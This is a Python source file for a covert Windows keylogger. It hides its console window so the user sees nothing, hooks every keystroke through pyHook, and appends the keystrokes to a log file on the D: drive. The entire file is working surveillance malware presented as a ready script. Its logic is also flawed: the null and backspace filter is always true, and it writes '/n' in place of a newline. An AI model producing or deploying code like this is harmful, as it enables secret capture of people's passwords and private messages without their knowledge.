#The file is saved as .pyw so that it runs silently

#Modules from PyWin32
import win32api
import win32console
import win32gui

#Modules from pyHook
import pythoncom, pyHook

#Hide the console so as the user doesn't see anything.
win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win,0)

path_to_logfile = 'd:\output.txt'

#Event Handler 
def OnKeyboardEvent(event):
 # Exit when  Ctrl+E   is pressed
 if event.Ascii==5:        
     exit(1)
 #Preventing null and backspace
 if event.Ascii != 0 or 8:
     #open the logfile in read mode
     f=open(path_to_logfile,'r')
     #store contents to a variable
     buffer=f.read()     
     f.close()
     #Open the file in write mode
     f=open('d:\output.txt','w')
     keylogs=chr(event.Ascii)
     #Appending new line if Enter is pressed  
     if event.Ascii==13:
         keylogs='/n'
     #Append to previous content
     buffer +=keylogs
     #write to the file
     f.write(buffer)
     f.close()

#Create a HookManager
hm = pyHook.HookManager()
#Assign event handler when the event of keydown occurs
hm.KeyDown = OnKeyboardEvent
# set the hook
hm.HookKeyboard()
#wait forever
pythoncom.PumpMessages()
